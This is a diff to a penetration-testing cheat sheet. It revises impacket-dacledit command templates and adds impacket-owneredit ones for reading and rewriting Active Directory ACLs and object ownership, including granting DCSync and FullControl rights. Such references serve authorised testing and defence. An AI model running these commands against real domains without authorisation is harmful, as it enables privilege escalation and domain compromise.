@@ -117,13 +117,22 @@ https://github.com/XiaoliChan/wmiexec-Pro
 - impacket-dacledit
 ```sh
 # write
-impacket-dacledit -ts -dc-ip 'IP' -principal-dn 'DN' -target-dn 'DN' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-dacledit -ts -dc-ip 'IP' -principal-sid 'SID' -target-sid 'SID' ~
-impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' ~
+impacket-dacledit -ts -dc-ip 'IP' -principal-dn 'DN' -target-dn 'DN' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
+impacket-dacledit -ts -dc-ip 'IP' -principal-sid 'SID' -target-sid 'SID' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
+impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
 # read
-impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action read -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action read -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
 # remove
-impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
+```
+- impacket-owneredit
+```sh
+# write
+impacket-owneredit -ts -dc-ip 'IP' -new-owner-dn 'DN' -target-dn 'DN' -action write 'DOMAIN/USERNAME:PASSWORD'
+impacket-owneredit -ts -dc-ip 'IP' -new-owner-sid 'SID' -target-sid 'SID' -action write 'DOMAIN/USERNAME:PASSWORD'
+impacket-owneredit -ts -dc-ip 'IP' -new-owner 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' -action write 'DOMAIN/USERNAME:PASSWORD'
+# read
+impacket-owneredit -ts -dc-ip 'IP' -target-dn 'DN' -action read 'DOMAIN/USERNAME:PASSWORD'
 ```
 - ldapdomaindump
 ```sh
